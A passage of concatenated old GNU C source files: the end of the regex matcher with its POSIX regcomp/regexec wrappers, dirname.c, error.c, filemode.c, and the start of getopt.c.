          break;

	case wordbeg:
          DEBUG_PRINT1 ("EXECUTING wordbeg.\n");
	  if (WORDCHAR_P (d) && (AT_STRINGS_BEG (d) || !WORDCHAR_P (d - 1)))
	    break;
          goto fail;

	case wordend:
          DEBUG_PRINT1 ("EXECUTING wordend.\n");
	  if (!AT_STRINGS_BEG (d) && WORDCHAR_P (d - 1)
              && (!WORDCHAR_P (d) || AT_STRINGS_END (d)))
	    break;
          goto fail;

#ifdef emacs
  	case before_dot:
          DEBUG_PRINT1 ("EXECUTING before_dot.\n");
 	  if (PTR_CHAR_POS ((unsigned char *) d) >= point)
  	    goto fail;
  	  break;
  
  	case at_dot:
          DEBUG_PRINT1 ("EXECUTING at_dot.\n");
 	  if (PTR_CHAR_POS ((unsigned char *) d) != point)
  	    goto fail;
  	  break;
  
  	case after_dot:
          DEBUG_PRINT1 ("EXECUTING after_dot.\n");
          if (PTR_CHAR_POS ((unsigned char *) d) <= point)
  	    goto fail;
  	  break;
#if 0 /* not emacs19 */
	case at_dot:
          DEBUG_PRINT1 ("EXECUTING at_dot.\n");
	  if (PTR_CHAR_POS ((unsigned char *) d) + 1 != point)
	    goto fail;
	  break;
#endif /* not emacs19 */

	case syntaxspec:
          DEBUG_PRINT2 ("EXECUTING syntaxspec %d.\n", mcnt);
	  mcnt = *p++;
	  goto matchsyntax;

        case wordchar:
          DEBUG_PRINT1 ("EXECUTING Emacs wordchar.\n");
	  mcnt = (int) Sword;
        matchsyntax:
	  PREFETCH ();
	  /* Can't use *d++ here; SYNTAX may be an unsafe macro.  */
	  d++;
	  if (SYNTAX (d[-1]) != (enum syntaxcode) mcnt)
	    goto fail;
          SET_REGS_MATCHED ();
	  break;

	case notsyntaxspec:
          DEBUG_PRINT2 ("EXECUTING notsyntaxspec %d.\n", mcnt);
	  mcnt = *p++;
	  goto matchnotsyntax;

        case notwordchar:
          DEBUG_PRINT1 ("EXECUTING Emacs notwordchar.\n");
	  mcnt = (int) Sword;
        matchnotsyntax:
	  PREFETCH ();
	  /* Can't use *d++ here; SYNTAX may be an unsafe macro.  */
	  d++;
	  if (SYNTAX (d[-1]) == (enum syntaxcode) mcnt)
	    goto fail;
	  SET_REGS_MATCHED ();
          break;

#else /* not emacs */
	case wordchar:
          DEBUG_PRINT1 ("EXECUTING non-Emacs wordchar.\n");
	  PREFETCH ();
          if (!WORDCHAR_P (d))
            goto fail;
	  SET_REGS_MATCHED ();
          d++;
	  break;
	  
	case notwordchar:
          DEBUG_PRINT1 ("EXECUTING non-Emacs notwordchar.\n");
	  PREFETCH ();
	  if (WORDCHAR_P (d))
            goto fail;
          SET_REGS_MATCHED ();
          d++;
	  break;
#endif /* not emacs */
          
        default:
          abort ();
	}
      continue;  /* Successfully executed one pattern command; keep going.  */


    /* We goto here if a matching operation fails. */
    fail:
      if (!FAIL_STACK_EMPTY ())
	{ /* A restart point is known.  Restore to that state.  */
          DEBUG_PRINT1 ("\nFAIL:\n");
          POP_FAILURE_POINT (d, p,
                             lowest_active_reg, highest_active_reg,
                             regstart, regend, reg_info);

          /* If this failure point is a dummy, try the next one.  */
          if (!p)
	    goto fail;

          /* If we failed to the end of the pattern, don't examine *p.  */
	  assert (p <= pend);
          if (p < pend)
            {
              boolean is_a_jump_n = false;
              
              /* If failed to a backwards jump that's part of a repetition
                 loop, need to pop this failure point and use the next one.  */
              switch ((re_opcode_t) *p)
                {
                case jump_n:
                  is_a_jump_n = true;
                case maybe_pop_jump:
                case pop_failure_jump:
                case jump:
                  p1 = p + 1;
                  EXTRACT_NUMBER_AND_INCR (mcnt, p1);
                  p1 += mcnt;	

                  if ((is_a_jump_n && (re_opcode_t) *p1 == succeed_n)
                      || (!is_a_jump_n
                          && (re_opcode_t) *p1 == on_failure_jump))
                    goto fail;
                  break;
                default:
                  /* do nothing */ ;
                }
            }

          if (d >= string1 && d <= end1)
	    dend = end_match_1;
        }
      else
        break;   /* Matching at this starting point really fails.  */
    } /* for (;;) */

  if (best_regs_set)
    goto restore_best_regs;

  FREE_VARIABLES ();

  return -1;         			/* Failure to match.  */
} /* re_match_2 */

/* Subroutine definitions for re_match_2.  */


/* We are passed P pointing to a register number after a start_memory.
   
   Return true if the pattern up to the corresponding stop_memory can
   match the empty string, and false otherwise.
   
   If we find the matching stop_memory, sets P to point to one past its number.
   Otherwise, sets P to an undefined byte less than or equal to END.

   We don't handle duplicates properly (yet).  */

static boolean
group_match_null_string_p (p, end, reg_info)
    unsigned char **p, *end;
    register_info_type *reg_info;
{
  int mcnt;
  /* Point to after the args to the start_memory.  */
  unsigned char *p1 = *p + 2;
  
  while (p1 < end)
    {
      /* Skip over opcodes that can match nothing, and return true or
	 false, as appropriate, when we get to one that can't, or to the
         matching stop_memory.  */
      
      switch ((re_opcode_t) *p1)
        {
        /* Could be either a loop or a series of alternatives.  */
        case on_failure_jump:
          p1++;
          EXTRACT_NUMBER_AND_INCR (mcnt, p1);
          
          /* If the next operation is not a jump backwards in the
	     pattern.  */

	  if (mcnt >= 0)
	    {
              /* Go through the on_failure_jumps of the alternatives,
                 seeing if any of the alternatives cannot match nothing.
                 The last alternative starts with only a jump,
                 whereas the rest start with on_failure_jump and end
                 with a jump, e.g., here is the pattern for `a|b|c':

                 /on_failure_jump/0/6/exactn/1/a/jump_past_alt/0/6
                 /on_failure_jump/0/6/exactn/1/b/jump_past_alt/0/3
                 /exactn/1/c						

                 So, we have to first go through the first (n-1)
                 alternatives and then deal with the last one separately.  */


              /* Deal with the first (n-1) alternatives, which start
                 with an on_failure_jump (see above) that jumps to right
                 past a jump_past_alt.  */

              while ((re_opcode_t) p1[mcnt-3] == jump_past_alt)
                {
                  /* `mcnt' holds how many bytes long the alternative
                     is, including the ending `jump_past_alt' and
                     its number.  */

                  if (!alt_match_null_string_p (p1, p1 + mcnt - 3, 
				                      reg_info))
                    return false;

                  /* Move to right after this alternative, including the
		     jump_past_alt.  */
                  p1 += mcnt;	

                  /* Break if it's the beginning of an n-th alternative
                     that doesn't begin with an on_failure_jump.  */
                  if ((re_opcode_t) *p1 != on_failure_jump)
                    break;
		
		  /* Still have to check that it's not an n-th
		     alternative that starts with an on_failure_jump.  */
		  p1++;
                  EXTRACT_NUMBER_AND_INCR (mcnt, p1);
                  if ((re_opcode_t) p1[mcnt-3] != jump_past_alt)
                    {
		      /* Get to the beginning of the n-th alternative.  */
                      p1 -= 3;
                      break;
                    }
                }

              /* Deal with the last alternative: go back and get number
                 of the `jump_past_alt' just before it.  `mcnt' contains
                 the length of the alternative.  */
              EXTRACT_NUMBER (mcnt, p1 - 2);

              if (!alt_match_null_string_p (p1, p1 + mcnt, reg_info))
                return false;

              p1 += mcnt;	/* Get past the n-th alternative.  */
            } /* if mcnt > 0 */
          break;

          
        case stop_memory:
	  assert (p1[1] == **p);
          *p = p1 + 2;
          return true;

        
        default: 
          if (!common_op_match_null_string_p (&p1, end, reg_info))
            return false;
        }
    } /* while p1 < end */

  return false;
} /* group_match_null_string_p */


/* Similar to group_match_null_string_p, but doesn't deal with alternatives:
   It expects P to be the first byte of a single alternative and END one
   byte past the last. The alternative can contain groups.  */
   
static boolean
alt_match_null_string_p (p, end, reg_info)
    unsigned char *p, *end;
    register_info_type *reg_info;
{
  int mcnt;
  unsigned char *p1 = p;
  
  while (p1 < end)
    {
      /* Skip over opcodes that can match nothing, and break when we get 
         to one that can't.  */
      
      switch ((re_opcode_t) *p1)
        {
	/* It's a loop.  */
        case on_failure_jump:
          p1++;
          EXTRACT_NUMBER_AND_INCR (mcnt, p1);
          p1 += mcnt;
          break;
          
	default: 
          if (!common_op_match_null_string_p (&p1, end, reg_info))
            return false;
        }
    }  /* while p1 < end */

  return true;
} /* alt_match_null_string_p */


/* Deals with the ops common to group_match_null_string_p and
   alt_match_null_string_p.  
   
   Sets P to one after the op and its arguments, if any.  */

static boolean
common_op_match_null_string_p (p, end, reg_info)
    unsigned char **p, *end;
    register_info_type *reg_info;
{
  int mcnt;
  boolean ret;
  int reg_no;
  unsigned char *p1 = *p;

  switch ((re_opcode_t) *p1++)
    {
    case no_op:
    case begline:
    case endline:
    case begbuf:
    case endbuf:
    case wordbeg:
    case wordend:
    case wordbound:
    case notwordbound:
#ifdef emacs
    case before_dot:
    case at_dot:
    case after_dot:
#endif
      break;

    case start_memory:
      reg_no = *p1;
      assert (reg_no > 0 && reg_no <= MAX_REGNUM);
      ret = group_match_null_string_p (&p1, end, reg_info);
      
      /* Have to set this here in case we're checking a group which
         contains a group and a back reference to it.  */

      if (REG_MATCH_NULL_STRING_P (reg_info[reg_no]) == MATCH_NULL_UNSET_VALUE)
        REG_MATCH_NULL_STRING_P (reg_info[reg_no]) = ret;

      if (!ret)
        return false;
      break;
          
    /* If this is an optimized succeed_n for zero times, make the jump.  */
    case jump:
      EXTRACT_NUMBER_AND_INCR (mcnt, p1);
      if (mcnt >= 0)
        p1 += mcnt;
      else
        return false;
      break;

    case succeed_n:
      /* Get to the number of times to succeed.  */
      p1 += 2;		
      EXTRACT_NUMBER_AND_INCR (mcnt, p1);

      if (mcnt == 0)
        {
          p1 -= 4;
          EXTRACT_NUMBER_AND_INCR (mcnt, p1);
          p1 += mcnt;
        }
      else
        return false;
      break;

    case duplicate: 
      if (!REG_MATCH_NULL_STRING_P (reg_info[*p1]))
        return false;
      break;

    case set_number_at:
      p1 += 4;

    default:
      /* All other opcodes mean we cannot match the empty string.  */
      return false;
  }

  *p = p1;
  return true;
} /* common_op_match_null_string_p */


/* Return zero if TRANSLATE[S1] and TRANSLATE[S2] are identical for LEN
   bytes; nonzero otherwise.  */
   
static int
bcmp_translate (s1, s2, len, translate)
     unsigned char *s1, *s2;
     register int len;
     char *translate;
{
  register unsigned char *p1 = s1, *p2 = s2;
  while (len)
    {
      if (translate[*p1++] != translate[*p2++]) return 1;
      len--;
    }
  return 0;
}

/* Entry points for GNU code.  */

/* re_compile_pattern is the GNU regular expression compiler: it
   compiles PATTERN (of length SIZE) and puts the result in BUFP.
   Returns 0 if the pattern was valid, otherwise an error string.
   
   Assumes the `allocated' (and perhaps `buffer') and `translate' fields
   are set in BUFP on entry.
   
   We call regex_compile to do the actual compilation.  */

const char *
re_compile_pattern (pattern, length, bufp)
     const char *pattern;
     int length;
     struct re_pattern_buffer *bufp;
{
  reg_errcode_t ret;
  
  /* GNU code is written to assume at least RE_NREGS registers will be set
     (and at least one extra will be -1).  */
  bufp->regs_allocated = REGS_UNALLOCATED;
  
  /* And GNU code determines whether or not to get register information
     by passing null for the REGS argument to re_match, etc., not by
     setting no_sub.  */
  bufp->no_sub = 0;
  
  /* Match anchors at newline.  */
  bufp->newline_anchor = 1;
  
  ret = regex_compile (pattern, length, re_syntax_options, bufp);

  return re_error_msg[(int) ret];
}     

/* Entry points compatible with 4.2 BSD regex library.  We don't define
   them unless specifically requested.  */

#ifdef _REGEX_RE_COMP

/* BSD has one and only one pattern buffer.  */
static struct re_pattern_buffer re_comp_buf;

char *
re_comp (s)
    const char *s;
{
  reg_errcode_t ret;
  
  if (!s)
    {
      if (!re_comp_buf.buffer)
	return "No previous regular expression";
      return 0;
    }

  if (!re_comp_buf.buffer)
    {
      re_comp_buf.buffer = (unsigned char *) malloc (200);
      if (re_comp_buf.buffer == NULL)
        return "Memory exhausted";
      re_comp_buf.allocated = 200;

      re_comp_buf.fastmap = (char *) malloc (1 << BYTEWIDTH);
      if (re_comp_buf.fastmap == NULL)
	return "Memory exhausted";
    }

  /* Since `re_exec' always passes NULL for the `regs' argument, we
     don't need to initialize the pattern buffer fields which affect it.  */

  /* Match anchors at newlines.  */
  re_comp_buf.newline_anchor = 1;

  ret = regex_compile (s, strlen (s), re_syntax_options, &re_comp_buf);
  
  /* Yes, we're discarding `const' here.  */
  return (char *) re_error_msg[(int) ret];
}


int
re_exec (s)
    const char *s;
{
  const int len = strlen (s);
  return
    0 <= re_search (&re_comp_buf, s, len, 0, len, (struct re_registers *) 0);
}
#endif /* _REGEX_RE_COMP */

/* POSIX.2 functions.  Don't define these for Emacs.  */

#ifndef emacs

/* regcomp takes a regular expression as a string and compiles it.

   PREG is a regex_t *.  We do not expect any fields to be initialized,
   since POSIX says we shouldn't.  Thus, we set

     `buffer' to the compiled pattern;
     `used' to the length of the compiled pattern;
     `syntax' to RE_SYNTAX_POSIX_EXTENDED if the
       REG_EXTENDED bit in CFLAGS is set; otherwise, to
       RE_SYNTAX_POSIX_BASIC;
     `newline_anchor' to REG_NEWLINE being set in CFLAGS;
     `fastmap' and `fastmap_accurate' to zero;
     `re_nsub' to the number of subexpressions in PATTERN.

   PATTERN is the address of the pattern string.

   CFLAGS is a series of bits which affect compilation.

     If REG_EXTENDED is set, we use POSIX extended syntax; otherwise, we
     use POSIX basic syntax.

     If REG_NEWLINE is set, then . and [^...] don't match newline.
     Also, regexec will try a match beginning after every newline.

     If REG_ICASE is set, then we considers upper- and lowercase
     versions of letters to be equivalent when matching.

     If REG_NOSUB is set, then when PREG is passed to regexec, that
     routine will report only success or failure, and nothing about the
     registers.

   It returns 0 if it succeeds, nonzero if it doesn't.  (See regex.h for
   the return codes and their meanings.)  */

int
regcomp (preg, pattern, cflags)
    regex_t *preg;
    const char *pattern; 
    int cflags;
{
  reg_errcode_t ret;
  unsigned syntax
    = (cflags & REG_EXTENDED) ?
      RE_SYNTAX_POSIX_EXTENDED : RE_SYNTAX_POSIX_BASIC;

  /* regex_compile will allocate the space for the compiled pattern.  */
  preg->buffer = 0;
  preg->allocated = 0;
  preg->used = 0;
  
  /* Don't bother to use a fastmap when searching.  This simplifies the
     REG_NEWLINE case: if we used a fastmap, we'd have to put all the
     characters after newlines into the fastmap.  This way, we just try
     every character.  */
  preg->fastmap = 0;
  
  if (cflags & REG_ICASE)
    {
      unsigned i;
      
      preg->translate = (char *) malloc (CHAR_SET_SIZE);
      if (preg->translate == NULL)
        return (int) REG_ESPACE;

      /* Map uppercase characters to corresponding lowercase ones.  */
      for (i = 0; i < CHAR_SET_SIZE; i++)
        preg->translate[i] = ISUPPER (i) ? tolower (i) : i;
    }
  else
    preg->translate = NULL;

  /* If REG_NEWLINE is set, newlines are treated differently.  */
  if (cflags & REG_NEWLINE)
    { /* REG_NEWLINE implies neither . nor [^...] match newline.  */
      syntax &= ~RE_DOT_NEWLINE;
      syntax |= RE_HAT_LISTS_NOT_NEWLINE;
      /* It also changes the matching behavior.  */
      preg->newline_anchor = 1;
    }
  else
    preg->newline_anchor = 0;

  preg->no_sub = !!(cflags & REG_NOSUB);

  /* POSIX says a null character in the pattern terminates it, so we 
     can use strlen here in compiling the pattern.  */
  ret = regex_compile (pattern, strlen (pattern), syntax, preg);
  
  /* POSIX doesn't distinguish between an unmatched open-group and an
     unmatched close-group: both are REG_EPAREN.  */
  if (ret == REG_ERPAREN) ret = REG_EPAREN;
  
  return (int) ret;
}


/* regexec searches for a given pattern, specified by PREG, in the
   string STRING.
   
   If NMATCH is zero or REG_NOSUB was set in the cflags argument to
   `regcomp', we ignore PMATCH.  Otherwise, we assume PMATCH has at
   least NMATCH elements, and we set them to the offsets of the
   corresponding matched substrings.
   
   EFLAGS specifies `execution flags' which affect matching: if
   REG_NOTBOL is set, then ^ does not match at the beginning of the
   string; if REG_NOTEOL is set, then $ does not match at the end.
   
   We return 0 if we find a match and REG_NOMATCH if not.  */

int
regexec (preg, string, nmatch, pmatch, eflags)
    const regex_t *preg;
    const char *string; 
    size_t nmatch; 
    regmatch_t pmatch[]; 
    int eflags;
{
  int ret;
  struct re_registers regs;
  regex_t private_preg;
  int len = strlen (string);
  boolean want_reg_info = !preg->no_sub && nmatch > 0;

  private_preg = *preg;
  
  private_preg.not_bol = !!(eflags & REG_NOTBOL);
  private_preg.not_eol = !!(eflags & REG_NOTEOL);
  
  /* The user has told us exactly how many registers to return
     information about, via `nmatch'.  We have to pass that on to the
     matching routines.  */
  private_preg.regs_allocated = REGS_FIXED;
  
  if (want_reg_info)
    {
      regs.num_regs = nmatch;
      regs.start = TALLOC (nmatch, regoff_t);
      regs.end = TALLOC (nmatch, regoff_t);
      if (regs.start == NULL || regs.end == NULL)
        return (int) REG_NOMATCH;
    }

  /* Perform the searching operation.  */
  ret = re_search (&private_preg, string, len,
                   /* start: */ 0, /* range: */ len,
                   want_reg_info ? &regs : (struct re_registers *) 0);
  
  /* Copy the register information to the POSIX structure.  */
  if (want_reg_info)
    {
      if (ret >= 0)
        {
          unsigned r;

          for (r = 0; r < nmatch; r++)
            {
              pmatch[r].rm_so = regs.start[r];
              pmatch[r].rm_eo = regs.end[r];
            }
        }

      /* If we needed the temporary register info, free the space now.  */
      free (regs.start);
      free (regs.end);
    }

  /* We want zero return to mean success, unlike `re_search'.  */
  return ret >= 0 ? (int) REG_NOERROR : (int) REG_NOMATCH;
}


/* Returns a message corresponding to an error code, ERRCODE, returned
   from either regcomp or regexec.   We don't use PREG here.  */

size_t
regerror (errcode, preg, errbuf, errbuf_size)
    int errcode;
    const regex_t *preg;
    char *errbuf;
    size_t errbuf_size;
{
  const char *msg;
  size_t msg_size;

  if (errcode < 0
      || errcode >= (sizeof (re_error_msg) / sizeof (re_error_msg[0])))
    /* Only error codes returned by the rest of the code should be passed 
       to this routine.  If we are given anything else, or if other regex
       code generates an invalid error code, then the program has a bug.
       Dump core so we can fix it.  */
    abort ();

  msg = re_error_msg[errcode];

  /* POSIX doesn't require that we do anything in this case, but why
     not be nice.  */
  if (! msg)
    msg = "Success";

  msg_size = strlen (msg) + 1; /* Includes the null.  */
  
  if (errbuf_size != 0)
    {
      if (msg_size > errbuf_size)
        {
          strncpy (errbuf, msg, errbuf_size - 1);
          errbuf[errbuf_size - 1] = 0;
        }
      else
        strcpy (errbuf, msg);
    }

  return msg_size;
}


/* Free dynamically allocated space used by PREG.  */

void
regfree (preg)
    regex_t *preg;
{
  if (preg->buffer != NULL)
    free (preg->buffer);
  preg->buffer = NULL;
  
  preg->allocated = 0;
  preg->used = 0;

  if (preg->fastmap != NULL)
    free (preg->fastmap);
  preg->fastmap = NULL;
  preg->fastmap_accurate = 0;

  if (preg->translate != NULL)
    free (preg->translate);
  preg->translate = NULL;
}

#endif /* not emacs  */

/*
Local variables:
make-backup-files: t
version-control: t
trim-versions-without-asking: nil
End:
*/
/* dirname.c -- return all but the last element in a path
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#else
char *malloc ();
#endif
#if defined(STDC_HEADERS) || defined(HAVE_STRING_H)
#include <string.h>
#else
#include <strings.h>
#ifndef strrchr
#define strrchr rindex
#endif
#endif

/* Return the leading directories part of PATH,
   allocated with malloc.  If out of memory, return 0.
   Assumes that trailing slashes have already been
   removed.  */

char *
dirname (path)
     char *path;
{
  char *newpath;
  char *slash;
  int length;			/* Length of result, not including NUL.  */

  slash = strrchr (path, '/');
  if (slash == 0)
    {
      /* File is in the current directory.  */
      path = ".";
      length = 1;
    }
  else
    {
      /* Remove any trailing slashes from the result.  */
      while (slash > path && *slash == '/')
	--slash;

      length = slash - path + 1;
    }
  newpath = (char *) malloc (length + 1);
  if (newpath == 0)
    return 0;
  strncpy (newpath, path, length);
  newpath[length] = 0;
  return newpath;
}
/* error.c -- error handler for noninteractive utilities
   Copyright (C) 1990, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@gnu.ai.mit.edu>.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>

#if HAVE_VPRINTF || HAVE_DOPRNT
# if __STDC__
#  include <stdarg.h>
#  define VA_START(args, lastarg) va_start(args, lastarg)
# else
#  include <varargs.h>
#  define VA_START(args, lastarg) va_start(args)
# endif
#else
# define va_alist a1, a2, a3, a4, a5, a6, a7, a8
# define va_dcl char *a1, *a2, *a3, *a4, *a5, *a6, *a7, *a8;
#endif

#if STDC_HEADERS
# include <stdlib.h>
# include <string.h>
#else
void exit ();
#endif

/* If NULL, error will flush stdout, then print on stderr the program
   name, a colon and a space.  Otherwise, error will call this
   function without parameters instead.  */
void (*error_print_progname) () = NULL;

/* The calling program should define program_name and set it to the
   name of the executing program.  */
extern char *program_name;

#if HAVE_STRERROR
char *strerror ();
#else
static char *
private_strerror (errnum)
     int errnum;
{
  extern char *sys_errlist[];
  extern int sys_nerr;

  if (errnum > 0 && errnum <= sys_nerr)
    return sys_errlist[errnum];
  return "Unknown system error";
}
#define strerror private_strerror
#endif

/* Print the program name and error message MESSAGE, which is a printf-style
   format string with optional args.
   If ERRNUM is nonzero, print its corresponding system error message.
   Exit with status STATUS if it is nonzero.  */
/* VARARGS */

void
#if defined(VA_START) && __STDC__
error (int status, int errnum, const char *message, ...)
#else
error (status, errnum, message, va_alist)
     int status;
     int errnum;
     char *message;
     va_dcl
#endif
{
#ifdef VA_START
  va_list args;
#endif

  if (error_print_progname)
    (*error_print_progname) ();
  else
    {
      fflush (stdout);
      fprintf (stderr, "%s: ", program_name);
    }

#ifdef VA_START
  VA_START (args, message);
# if HAVE_VPRINTF
  vfprintf (stderr, message, args);
# else
  _doprnt (message, args, stderr);
# endif
  va_end (args);
#else
  fprintf (stderr, message, a1, a2, a3, a4, a5, a6, a7, a8);
#endif

  if (errnum)
    fprintf (stderr, ": %s", strerror (errnum));
  putc ('\n', stderr);
  fflush (stderr);
  if (status)
    exit (status);
}
/* filemode.c -- make a string describing file modes
   Copyright (C) 1985, 1990, 1993 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>
#include <sys/stat.h>

#ifndef S_IREAD
#define S_IREAD S_IRUSR
#define S_IWRITE S_IWUSR
#define S_IEXEC S_IXUSR
#endif

#ifdef STAT_MACROS_BROKEN
#undef S_ISBLK
#undef S_ISCHR
#undef S_ISDIR
#undef S_ISFIFO
#undef S_ISLNK
#undef S_ISMPB
#undef S_ISMPC
#undef S_ISNWK
#undef S_ISREG
#undef S_ISSOCK
#endif /* STAT_MACROS_BROKEN.  */

#if !defined(S_ISBLK) && defined(S_IFBLK)
#define S_ISBLK(m) (((m) & S_IFMT) == S_IFBLK)
#endif
#if !defined(S_ISCHR) && defined(S_IFCHR)
#define S_ISCHR(m) (((m) & S_IFMT) == S_IFCHR)
#endif
#if !defined(S_ISDIR) && defined(S_IFDIR)
#define S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)
#endif
#if !defined(S_ISREG) && defined(S_IFREG)
#define S_ISREG(m) (((m) & S_IFMT) == S_IFREG)
#endif
#if !defined(S_ISFIFO) && defined(S_IFIFO)
#define S_ISFIFO(m) (((m) & S_IFMT) == S_IFIFO)
#endif
#if !defined(S_ISLNK) && defined(S_IFLNK)
#define S_ISLNK(m) (((m) & S_IFMT) == S_IFLNK)
#endif
#if !defined(S_ISSOCK) && defined(S_IFSOCK)
#define S_ISSOCK(m) (((m) & S_IFMT) == S_IFSOCK)
#endif
#if !defined(S_ISMPB) && defined(S_IFMPB) /* V7 */
#define S_ISMPB(m) (((m) & S_IFMT) == S_IFMPB)
#define S_ISMPC(m) (((m) & S_IFMT) == S_IFMPC)
#endif
#if !defined(S_ISNWK) && defined(S_IFNWK) /* HP/UX */
#define S_ISNWK(m) (((m) & S_IFMT) == S_IFNWK)
#endif

void mode_string ();
static char ftypelet ();
static void rwx ();
static void setst ();

/* filemodestring - fill in string STR with an ls-style ASCII
   representation of the st_mode field of file stats block STATP.
   10 characters are stored in STR; no terminating null is added.
   The characters stored in STR are:

   0	File type.  'd' for directory, 'c' for character
	special, 'b' for block special, 'm' for multiplex,
	'l' for symbolic link, 's' for socket, 'p' for fifo,
	'-' for regular, '?' for any other file type

   1	'r' if the owner may read, '-' otherwise.

   2	'w' if the owner may write, '-' otherwise.

   3	'x' if the owner may execute, 's' if the file is
	set-user-id, '-' otherwise.
	'S' if the file is set-user-id, but the execute
	bit isn't set.

   4	'r' if group members may read, '-' otherwise.

   5	'w' if group members may write, '-' otherwise.

   6	'x' if group members may execute, 's' if the file is
	set-group-id, '-' otherwise.
	'S' if it is set-group-id but not executable.

   7	'r' if any user may read, '-' otherwise.

   8	'w' if any user may write, '-' otherwise.

   9	'x' if any user may execute, 't' if the file is "sticky"
	(will be retained in swap space after execution), '-'
	otherwise.
	'T' if the file is sticky but not executable.  */

void
filemodestring (statp, str)
     struct stat *statp;
     char *str;
{
  mode_string (statp->st_mode, str);
}

/* Like filemodestring, but only the relevant part of the `struct stat'
   is given as an argument.  */

void
mode_string (mode, str)
     unsigned short mode;
     char *str;
{
  str[0] = ftypelet ((long) mode);
  rwx ((mode & 0700) << 0, &str[1]);
  rwx ((mode & 0070) << 3, &str[4]);
  rwx ((mode & 0007) << 6, &str[7]);
  setst (mode, str);
}

/* Return a character indicating the type of file described by
   file mode BITS:
   'd' for directories
   'b' for block special files
   'c' for character special files
   'm' for multiplexor files
   'l' for symbolic links
   's' for sockets
   'p' for fifos
   '-' for regular files
   '?' for any other file type.  */

static char
ftypelet (bits)
     long bits;
{
#ifdef S_ISBLK
  if (S_ISBLK (bits))
    return 'b';
#endif
  if (S_ISCHR (bits))
    return 'c';
  if (S_ISDIR (bits))
    return 'd';
  if (S_ISREG (bits))
    return '-';
#ifdef S_ISFIFO
  if (S_ISFIFO (bits))
    return 'p';
#endif
#ifdef S_ISLNK
  if (S_ISLNK (bits))
    return 'l';
#endif
#ifdef S_ISSOCK
  if (S_ISSOCK (bits))
    return 's';
#endif
#ifdef S_ISMPC
  if (S_ISMPC (bits))
    return 'm';
#endif
#ifdef S_ISNWK
  if (S_ISNWK (bits))
    return 'n';
#endif
  return '?';
}

/* Look at read, write, and execute bits in BITS and set
   flags in CHARS accordingly.  */

static void
rwx (bits, chars)
     unsigned short bits;
     char *chars;
{
  chars[0] = (bits & S_IREAD) ? 'r' : '-';
  chars[1] = (bits & S_IWRITE) ? 'w' : '-';
  chars[2] = (bits & S_IEXEC) ? 'x' : '-';
}

/* Set the 's' and 't' flags in file attributes string CHARS,
   according to the file mode BITS.  */

static void
setst (bits, chars)
     unsigned short bits;
     char *chars;
{
#ifdef S_ISUID
  if (bits & S_ISUID)
    {
      if (chars[3] != 'x')
	/* Set-uid, but not executable by owner.  */
	chars[3] = 'S';
      else
	chars[3] = 's';
    }
#endif
#ifdef S_ISGID
  if (bits & S_ISGID)
    {
      if (chars[6] != 'x')
	/* Set-gid, but not executable by group.  */
	chars[6] = 'S';
      else
	chars[6] = 's';
    }
#endif
#ifdef S_ISVTX
  if (bits & S_ISVTX)
    {
      if (chars[9] != 'x')
	/* Sticky, but not executable by others.  */
	chars[9] = 'T';
      else
	chars[9] = 't';
    }
#endif
}
/* Getopt for GNU.
   NOTE: getopt is now part of the C library, so if you don't know what
   "Keep this file name-space clean" means, talk to roland@gnu.ai.mit.edu
   before changing it!

   Copyright (C) 1987, 88, 89, 90, 91, 92, 93, 94
   	Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify it
   under the terms of the GNU General Public License as published by the
   Free Software Foundation; either version 2, or (at your option) any
   later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* This tells Alpha OSF/1 not to define a getopt prototype in <stdio.h>.
   Ditto for AIX 3.2 and <stdlib.h>.  */
#ifndef _NO_PROTO
#define _NO_PROTO
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#if !defined (__STDC__) || !__STDC__
/* This is a separate conditional since some stdc systems
   reject `defined (const)'.  */
#ifndef const
#define const
#endif
#endif

#include <stdio.h>

/* Comment out all this code if we are using the GNU C Library, and are not
   actually compiling the library itself.  This code is part of the GNU C
   Library, but also included in many other GNU distributions.  Compiling
   and linking in this code is a waste when using the GNU C library
   (especially if it is a shared library).  Rather than having every GNU
   program understand `configure --with-gnu-libc' and omit the object files,
   it is simpler to just do this in the source for each such file.  */

#if defined (_LIBC) || !defined (__GNU_LIBRARY__)


/* This needs to come after some library #include
   to get __GNU_LIBRARY__ defined.  */
#ifdef	__GNU_LIBRARY__
/* Don't include stdlib.h for non-GNU C libraries because some of them
